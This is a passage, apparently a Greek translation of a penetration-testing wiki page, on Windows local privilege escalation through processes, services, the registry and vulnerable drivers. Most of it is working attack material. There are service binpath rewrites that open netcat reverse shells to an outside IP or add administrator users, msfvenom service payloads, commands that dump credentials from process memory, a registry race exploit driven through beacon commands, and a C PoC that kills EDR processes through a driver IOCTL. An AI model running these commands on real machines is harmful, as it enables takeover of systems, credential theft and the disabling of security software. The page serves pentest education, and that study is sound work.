Πρώτα απ' όλα, κατά την απαρίθμηση των διεργασιών **ελέγξτε για κωδικούς πρόσβασης μέσα στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε αν μπορείτε να **αντικαταστήσετε κάποιο binary που εκτελείται** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του binary, ώστε να εκμεταλλευτείτε πιθανές [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Να ελέγχετε πάντα για πιθανούς [**electron/cef/chromium debuggers** που εκτελούνται, καθώς θα μπορούσατε να τους εκμεταλλευτείτε για κλιμάκωση προνομίων](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος των δικαιωμάτων των binary των processes**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος των δικαιωμάτων των φακέλων των δυαδικών αρχείων των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Μπορείτε να δημιουργήσετε ένα memory dump μιας εκτελούμενης διεργασίας χρησιμοποιώντας το **procdump** από το sysinternals. Υπηρεσίες όπως το FTP έχουν τα **credentials σε clear text στη μνήμη**. Δοκιμάστε να κάνετε dump της μνήμης και να διαβάσετε τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Ανασφαλείς εφαρμογές GUI

**Οι εφαρμογές που εκτελούνται ως SYSTEM ενδέχεται να επιτρέπουν σε έναν χρήστη να εκκινήσει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), αναζητήστε το "command prompt" και κάντε κλικ στο "Click to open Command Prompt"

## Υπηρεσίες

Τα Service Triggers επιτρέπουν στα Windows να εκκινούν μια υπηρεσία όταν προκύπτουν συγκεκριμένες συνθήκες (δραστηριότητα named pipe/RPC endpoint, συμβάντα ETW, διαθεσιμότητα IP, σύνδεση συσκευής, ανανέωση GPO κ.λπ.). Ακόμη και χωρίς δικαιώματα SERVICE_START, συχνά μπορείτε να εκκινήσετε προνομιούχες υπηρεσίες ενεργοποιώντας τα triggers τους. Δείτε εδώ τεχνικές enumeration και activation:

-
{{#ref}}
service-triggers.md
{{#endref}}

Λάβετε μια λίστα υπηρεσιών:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε το **sc** για να λάβετε πληροφορίες σχετικά με μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το binary **accesschk** από το _Sysinternals_ για να ελέγχετε το απαιτούμενο επίπεδο δικαιωμάτων για κάθε service.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε αν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Μπορείτε να κατεβάσετε το accesschk.exe για XP από εδώ](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν αντιμετωπίζετε αυτό το σφάλμα (για παράδειγμα με το SSDPSRV):

_Παρουσιάστηκε σφάλμα συστήματος 1058._\
_Η υπηρεσία δεν μπορεί να εκκινηθεί, είτε επειδή είναι απενεργοποιημένη είτε επειδή δεν υπάρχουν ενεργοποιημένες συσκευές που να σχετίζονται με αυτήν._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση** για αυτό το πρόβλημα είναι η εκτέλεση:
```
sc.exe config usosvc start= auto
```
### **Τροποποίηση διαδρομής binary υπηρεσίας**

Στο σενάριο όπου η ομάδα "Authenticated users" διαθέτει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου binary της υπηρεσίας. Για τροποποίηση και εκτέλεση του **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Τα privileges μπορούν να κλιμακωθούν μέσω διαφόρων permissions:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την επαναδιαμόρφωση του service binary.
- **WRITE_DAC**: Επιτρέπει την επαναδιαμόρφωση των permissions, οδηγώντας στη δυνατότητα αλλαγής των configurations του service.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ownership και την επαναδιαμόρφωση των permissions.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής των configurations του service.
- **GENERIC_ALL**: Επίσης κληρονομεί τη δυνατότητα αλλαγής των configurations του service.

Για τον εντοπισμό και την exploitation αυτής της ευπάθειας, μπορεί να χρησιμοποιηθεί το _exploit/windows/local/service_permissions_.

### Αδύναμα permissions των service binaries

Αν ένα service εκτελείται ως **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ή ως privileged domain account, αλλά οι low-privileged users μπορούν να τροποποιήσουν το service EXE ή το parent folder του, το service μπορεί συχνά να γίνει hijack μέσω **αντικατάστασης του binary και επανεκκίνησης του service**.

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από ένα service** ή αν έχετε **write permissions στο folder** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Μπορείτε να λάβετε κάθε binary που εκτελείται από ένα service χρησιμοποιώντας το **wmic** (όχι στο system32) και να ελέγξετε τα permissions σας χρησιμοποιώντας το **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε τα **sc** και **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Αναζητήστε επικίνδυνα ACLs που έχουν εκχωρηθεί στα **`Everyone`**, **`BUILTIN\Users`** ή **`Authenticated Users`**, ειδικά **`(F)`**, **`(M)`** ή **`(W)`** στο executable της υπηρεσίας ή στον κατάλογο που το περιέχει. Μια πρακτική ροή abuse είναι:<sup>[[27]](#references)</sup>

1. Επιβεβαιώστε τον λογαριασμό της υπηρεσίας και τη διαδρομή του executable με `sc qc <service_name>`.
2. Επιβεβαιώστε ότι το binary είναι εγγράψιμο με `icacls <path>`.
3. Αντικαταστήστε το service binary με ένα payload ή ένα έγκυρο κακόβουλο service binary.
4. Κάντε επανεκκίνηση της υπηρεσίας με `sc stop <service_name> && sc start <service_name>` (ή περιμένετε για reboot / service trigger).

Χρήσιμοι αυτοματοποιημένοι έλεγχοι:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Αν η υπηρεσία δεν επιτρέπει σε έναν κανονικό χρήστη να την επανεκκινήσει, ελέγξτε αν εκκινείται αυτόματα κατά την εκκίνηση, αν διαθέτει ενέργεια αποτυχίας που την επανεκκινεί ή αν μπορεί να ενεργοποιηθεί έμμεσα από την εφαρμογή που τη χρησιμοποιεί.

### Δικαιώματα τροποποίησης μητρώου υπηρεσίας

Θα πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε οποιοδήποτε μητρώο υπηρεσίας.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας σε ένα **μητρώο** υπηρεσίας ως εξής:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Θα πρέπει να ελεγχθεί αν οι **Authenticated Users** ή το **NT AUTHORITY\INTERACTIVE** διαθέτουν δικαιώματα `FullControl`. Εάν ισχύει αυτό, το binary που εκτελείται από την υπηρεσία μπορεί να τροποποιηθεί.

Για να αλλάξετε το Path του binary που εκτελείται:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Race με registry symlink για αυθαίρετη εγγραφή τιμής HKLM (ATConfig)

Ορισμένες δυνατότητες προσβασιμότητας των Windows δημιουργούν κλειδιά **ATConfig** ανά χρήστη, τα οποία αργότερα αντιγράφονται από μια διεργασία **SYSTEM** σε ένα κλειδί συνεδρίας HKLM. Ένα **symbolic link race** στο registry μπορεί να ανακατευθύνει αυτή την προνομιούχα εγγραφή σε **οποιοδήποτε path HKLM**, παρέχοντας primitive για αυθαίρετη **εγγραφή τιμής** HKLM.<sup>[[18]](#references)</sup>

Βασικές τοποθεσίες (παράδειγμα: Πληκτρολόγιο οθόνης `osk`):

- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` περιέχει τις εγκατεστημένες δυνατότητες προσβασιμότητας.
- Το `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` αποθηκεύει configuration που ελέγχεται από τον χρήστη.
- Το `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` δημιουργείται κατά το logon/τις μεταβάσεις secure-desktop και είναι εγγράψιμο από τον χρήστη.

Ροή κατάχρησης (CVE-2026-24291 / ATConfig):

1. Συμπλήρωσε την τιμή **HKCU ATConfig** που θέλεις να εγγραφεί από το SYSTEM.
2. Ενεργοποίησε την αντιγραφή του secure-desktop (π.χ. **LockWorkstation**), η οποία ξεκινά τη ροή του AT broker.
3. **Κέρδισε το race** τοποθετώντας ένα **oplock** στο `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; όταν ενεργοποιηθεί το oplock, αντικατάστησε το **HKLM Session ATConfig** key με ένα **registry link** προς έναν προστατευμένο στόχο HKLM.
4. Το SYSTEM γράφει την τιμή που επέλεξε ο attacker στο ανακατευθυνόμενο path HKLM.

Μόλις αποκτήσεις primitive για αυθαίρετη εγγραφή τιμής HKLM, κάνε pivot σε LPE τροποποιώντας τιμές configuration υπηρεσιών:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Επίλεξε μια υπηρεσία που μπορεί να εκκινήσει ένας κανονικός χρήστης (π.χ. **`msiserver`**) και ενεργοποίησέ την μετά την εγγραφή. **Σημείωση:** η public exploit implementation **κλειδώνει το workstation** ως μέρος του race.

Παραδείγματα tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Δικαιώματα AppendData/AddSubdirectory στο registry των Services

Αν έχετε αυτό το permission σε ένα registry, αυτό σημαίνει ότι **μπορείτε να δημιουργήσετε sub registries από αυτό**. Στην περίπτωση των Windows services, αυτό είναι **αρκετό για την εκτέλεση arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Αν το path προς ένα executable δεν βρίσκεται μέσα σε quotes, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τμήμα που τελειώνει πριν από ένα κενό.

Για παράδειγμα, για το path _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Παράθεσε όλες τις διαδρομές υπηρεσιών χωρίς εισαγωγικά, εξαιρώντας όσες ανήκουν σε ενσωματωμένες υπηρεσίες των Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να εντοπίσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα δυαδικό αρχείο υπηρεσίας με το metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Ενέργειες αποκατάστασης

Τα Windows επιτρέπουν στους χρήστες να καθορίζουν τις ενέργειες που θα εκτελούνται σε περίπτωση αποτυχίας μιας υπηρεσίας. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα binary. Αν αυτό το binary μπορεί να αντικατασταθεί, ενδέχεται να είναι δυνατή η privilege escalation. Περισσότερες λεπτομέρειες θα βρείτε στην [επίσημη τεκμηρίωση](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Εφαρμογές

### Εγκατεστημένες εφαρμογές

Ελέγξτε τα **δικαιώματα των binaries** (ίσως μπορείτε να αντικαταστήσετε κάποιο και να πραγματοποιήσετε privilege escalation) και των **φακέλων** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο config file ώστε να διαβάσετε κάποιο ειδικό file ή αν μπορείτε να τροποποιήσετε κάποιο binary που πρόκειται να εκτελεστεί από έναν λογαριασμό Administrator (schedtasks).

Ένας τρόπος για να εντοπίσετε αδύναμα δικαιώματα σε φακέλους/αρχεία στο σύστημα είναι να εκτελέσετε:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Persistence/execution μέσω autoload plugin στο Notepad++

Το Notepad++ φορτώνει αυτόματα οποιοδήποτε plugin DLL βρίσκεται στους υποφακέλους `plugins`. Αν υπάρχει writable portable/copy install, η τοποθέτηση ενός malicious plugin παρέχει automatic code execution μέσα στο `notepad++.exe` σε κάθε εκκίνηση (συμπεριλαμβανομένων των `DllMain` και των plugin callbacks).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Εκτέλεση κατά την εκκίνηση

**Ελέγξτε αν μπορείτε να κάνετε overwrite κάποιο registry ή binary που πρόκειται να εκτελεστεί από διαφορετικό user.**\
**Διαβάστε** την **ακόλουθη σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέρουσες **autoruns locations για privilege escalation**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Αναζητήστε πιθανούς **third party weird/vulnerable** drivers
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Εάν ένας driver εκθέτει ένα arbitrary kernel read/write primitive (συνηθισμένο σε poorly designed IOCTL handlers), μπορείτε να κάνετε escalate κλέβοντας απευθείας ένα SYSTEM token από τη kernel memory.<sup>[[13]](#references)</sup> Δείτε την step-by-step technique εδώ:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Για bugs τύπου race-condition, όπου το vulnerable call ανοίγει ένα attacker-controlled Object Manager path, η σκόπιμη επιβράδυνση του lookup (με χρήση components μέγιστου μήκους ή deep directory chains) μπορεί να αυξήσει το window από microseconds σε δεκάδες microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, disclosures από paged-pool και I/O ring pivots

Ορισμένα Windows kernel LPE chains μπορούν να δημιουργηθούν από δύο μεμονωμένα weak bugs: ένα **cancel-safe queue lifetime race** που αποδεσμεύει ένα request/CBD ενώ το queue lock είναι ακόμη held, και ένα **lock-release-before-copy** disclosure που κάνει leak ένα freed paged-pool allocation κατά το `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Σημειώσεις για audit και exploitation:

- **Free-under-lock + cancel afterwards**: αναζητήστε ένα success path που κάνει **Acquire -> CompleteRequest/free -> Release**, ενώ το cancel path κάνει **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Εάν το success path φτάσει στα `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` πριν απελευθερώσει το CBDQ/CSQ lock, ένα thread που έχει μπλοκαριστεί στο `NtCancelIoFileEx -> IopCsqCancelRoutine` μπορεί αργότερα να συνεχίσει και να περάσει ένα freed `PFLT_CALLBACK_DATA` πίσω στο remove callback του driver.
- **Κάντε reclaim το freed queue object** με μια same-sized, attacker-controlled paged-pool allocation. Τα `NPFS` Data Queue Entries είναι χρήσιμα, επειδή το payload και το size είναι controllable και μπορείτε αργότερα να τα κάνετε probe με pipe read/peek operations. Εάν το freed object περιέχει list links, κάντε overwrite τους με μια **cyclic list από fake request nodes στη user memory**, ώστε ο driver να επεξεργάζεται επανειλημμένα attacker-defined request structures αντί να τερματίζει στο αρχικό list head.
- **Κάντε upgrade ένα predictable write**: εάν το fake request ανακατευθύνει έναν nested context pointer που χρησιμοποιείται από bookkeeping writes (timestamps / QPC / refcount-adjacent fields), μπορεί να αποκτήσετε ένα **address-controlled αλλά όχι value-controlled** kernel write. Σε αυτή την περίπτωση, στοχεύστε το **length/size** field ενός sprayed pool object αντί για ένα τελικό code/data pointer και, στη συνέχεια, κάντε enumerate το spray μέχρι το corrupted object να προκαλέσει ένα **out-of-bounds paged-pool read**.
- **Raceable disclosure pattern**: οποιοδήποτε syscall κάνει `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` είναι ισχυρός υποψήφιος. Η reliability βελτιώνεται όταν ο attacker μπορεί να αυξήσει το copied buffer (για παράδειγμα προσθέτοντας πολλά list/resource entries που αυξάνουν το τελικό allocation size ενός serializer), επειδή το μεγαλύτερο copy διευρύνει το replacement window χωρίς απαραίτητα να κάνει crash το σύστημα.
- **Pointer-rich refill targets**: τα registered-buffer arrays του Windows **I/O ring** είναι εξαιρετικοί disclosure targets, επειδή το paged-pool size τους ελέγχεται από τον attacker (`8 * regBufferCnt`) και κάθε element είναι ένας kernel pointer σε ένα `_IOP_MC_BUFFER_ENTRY`. Κάντε leak ένα από αυτά τα arrays, ανακτήστε το περιβάλλον `IORING_OBJECT` και, στη συνέχεια, κάντε corrupt τα **`RegBuffers`** και **`RegBuffersCount`**, ώστε οι επόμενες I/O ring operations να καταναλώνουν attacker-forged entries και να παρέχουν arbitrary kernel read/write. Εάν το μόνο διαθέσιμο write σάς δίνει ένα stable byte (για παράδειγμα από το `KUSER_SHARED_DATA+0x14`), χρησιμοποιήστε **overlapping unaligned writes** για να δημιουργήσετε έναν repeated-byte user pointer όπως το `0x0101010101010101`, κάντε map τη διεύθυνση με `VirtualAlloc` και τοποθετήστε εκεί το forged registered-buffer array.<sup>[[30]](#references)</sup>

Χρήσιμοι debugging indicators:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Μόλις αποκτήσεις arbitrary kernel read/write από το corrupted I/O ring, κλέψε ένα SYSTEM token χρησιμοποιώντας το standard post-primitive workflow:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Οι σύγχρονες hive vulnerabilities επιτρέπουν deterministic layouts, κατάχρηση writable descendants των HKLM/HKU και μετατροπή της metadata corruption σε kernel paged-pool overflows χωρίς custom driver. Μάθε ολόκληρη την αλυσίδα εδώ:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion από attacker-controlled paths

Ορισμένοι drivers δέχονται ένα registry path από το userland, επικυρώνουν μόνο ότι είναι ένα έγκυρο UTF-16 string και στη συνέχεια καλούν `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` με `RTL_QUERY_REGISTRY_DIRECT` σε ένα stack scalar, όπως το `int readValue`. Αν λείπει το `RTL_QUERY_REGISTRY_TYPECHECK`, το `EntryContext` ερμηνεύεται σύμφωνα με τον **actual** registry type και όχι σύμφωνα με τον τύπο που ανέμενε ο developer.

Αυτό δημιουργεί δύο χρήσιμα primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: ένα user-controlled absolute `\Registry\...` path επιτρέπει στον driver να κάνει query σε keys που επιλέγει ο attacker, να διαρρέει την ύπαρξή τους μέσω return codes/logs και, σε ορισμένες περιπτώσεις, να διαβάζει values στα οποία ο caller δεν θα μπορούσε να έχει άμεση πρόσβαση.
- **Kernel memory corruption**: ένας scalar destination όπως το `&readValue` υφίσταται type confusion ως `REG_QWORD`, `UNICODE_STRING` ή sized binary buffer, ανάλογα με τον registry value type.

Πρακτικές σημειώσεις exploitation:

- **Windows 8+ mitigation**: αν το query αφορά ένα **untrusted hive** με `RTL_QUERY_REGISTRY_DIRECT`, αλλά χωρίς `RTL_QUERY_REGISTRY_TYPECHECK`, οι kernel callers καταρρέουν με `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Για να διατηρήσεις τη δυνατότητα exploitation, αναζήτησε **attacker-writable keys μέσα σε trusted system hives** αντί να κάνεις staging values κάτω από το `HKCU`.
- **Trusted-hive staging**: χρησιμοποίησε το NtObjectManager για να απαριθμήσεις writable descendants του `\Registry\Machine` και εκτέλεσε ξανά το scan με duplicated **low-integrity** token, ώστε να εντοπίσεις keys που είναι προσβάσιμα από sandboxed contexts:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: μια απευθείας εγγραφή 8 byte σε ένα `int` 4 byte καταστρέφει γειτονικά δεδομένα της stack και μπορεί να αντικαταστήσει μερικώς έναν κοντινό callback/function pointer.
- **`REG_SZ` / `REG_EXPAND_SZ`**: το direct mode αναμένει το `EntryContext` να δείχνει σε ένα `UNICODE_STRING`. Αν ο κώδικας φορτώσει πρώτα ένα ελεγχόμενο από τον attacker `REG_DWORD` σε ένα stack scalar και στη συνέχεια επαναχρησιμοποιήσει το ίδιο buffer για string read, ο attacker ελέγχει τα `Length`/`MaximumLength` και επηρεάζει μερικώς τον `Buffer` pointer, προκαλώντας ένα semi-controlled kernel write.
- **`REG_BINARY`**: για μεγάλα binary data, το direct mode αντιμετωπίζει το πρώτο `LONG` στο `EntryContext` ως signed buffer size. Αν ένα προηγούμενο `REG_DWORD` read αφήσει μια **αρνητική**, ελεγχόμενη από τον attacker τιμή στο επαναχρησιμοποιημένο scalar, το επόμενο `REG_BINARY` query αντιγράφει bytes του attacker απευθείας πάνω από γειτονικά stack slots, κάτι που αποτελεί συχνά την καθαρότερη διαδρομή για πλήρη αντικατάσταση callback-pointer.

Ισχυρό hunting pattern: **ετερογενή registry reads στην ίδια stack variable χωρίς επαναρχικοποίησή της**. Κάντε grep για `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, επαναχρησιμοποιημένα `EntryContext` pointers και code paths όπου το πρώτο registry read ελέγχει αν θα πραγματοποιηθεί δεύτερο read.

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Ορισμένοι signed third‑party drivers δημιουργούν το device object τους με ισχυρό SDDL μέσω του IoCreateDeviceSecure, αλλά παραλείπουν να ορίσουν το FILE_DEVICE_SECURE_OPEN στο DeviceCharacteristics. Χωρίς αυτό το flag, το secure DACL δεν εφαρμόζεται όταν η συσκευή ανοίγει μέσω path που περιέχει επιπλέον component, επιτρέποντας σε οποιονδήποτε unprivileged user να αποκτήσει handle χρησιμοποιώντας ένα namespace path όπως:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (από πραγματικό περιστατικό)

Μόλις ένας user μπορεί να ανοίξει τη συσκευή, τα privileged IOCTLs που εκθέτει ο driver μπορούν να γίνουν αντικείμενο abuse για LPE και tampering. Παραδείγματα δυνατοτήτων που έχουν παρατηρηθεί στην πράξη:
- Επιστροφή handles πλήρους πρόσβασης σε arbitrary processes (κλοπή token / SYSTEM shell μέσω DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- Τερματισμός arbitrary processes, συμπεριλαμβανομένων των Protected Process/Light (PP/PPL), επιτρέποντας AV/EDR kill από user land μέσω kernel.

Ελάχιστο μοτίβο PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations για developers
- Να ορίζετε πάντα το FILE_DEVICE_SECURE_OPEN κατά τη δημιουργία device objects που προορίζονται να περιορίζονται από ένα DACL.
